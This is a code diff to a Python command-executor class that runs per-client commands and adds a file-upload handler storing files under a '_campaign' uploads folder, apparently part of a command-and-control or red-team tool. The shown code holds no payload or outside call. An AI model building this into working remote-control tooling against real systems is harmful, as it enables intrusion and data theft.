@@ -4,6 +4,8 @@ import subprocess
 import threading
 import platform
 import time
+import os
+import base64
 
 # Configure logging for command execution
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
@@ -43,9 +45,8 @@ class CommandExecutor:
                 logger.info(f"Command result for {client_id}: {result}")
                 self.update_history(client_id, command, result)
             elif command_type == "upload":
-                # Placeholder for upload logic (not implemented here)
-                result = f"Upload command '{args}' not implemented yet"
-                logger.info(f"Command result for {client_id}: {result}")
+                result = self.handle_file_upload(client_id, args)
+                logger.info(f"Upload result for {client_id}: {result}")
                 self.update_history(client_id, command, result)
             else:
                 logger.warning(f"Unknown command type '{command_type}' for client {client_id}")
@@ -77,6 +78,32 @@ class CommandExecutor:
             return f"Command failed with error: {e.stderr.strip()}"
         except Exception as e:
             return f"Execution error: {str(e)}"
+
+    def handle_file_upload(self, client_id, filepath):
+        """Handle file upload command by preparing to receive a file."""
+        try:
+            # Check if the file exists first
+            if not os.path.exists(filepath):
+                return f"File not found: {filepath}"
+                
+            # Determine where to store uploaded files
+            campaign_dirs = [d for d in os.listdir() if d.endswith("_campaign") and os.path.isdir(d)]
+            if not campaign_dirs:
+                return "No campaign directory found for uploads"
+                
+            campaign_folder = campaign_dirs[0]
+            uploads_folder = os.path.join(campaign_folder, "uploads", client_id)
+            os.makedirs(uploads_folder, exist_ok=True)
+            
+            # Generate a target filename
+            filename = os.path.basename(filepath)
+            target_path = os.path.join(uploads_folder, filename)
+            
+            # Return details about the pending upload
+            return f"Upload prepared for {filepath}, waiting for file content..."
+            
+        except Exception as e:
+            return f"Error preparing for upload: {str(e)}"
 
     def update_history(self, client_id, command, result):
         """Update client history with execution result."""
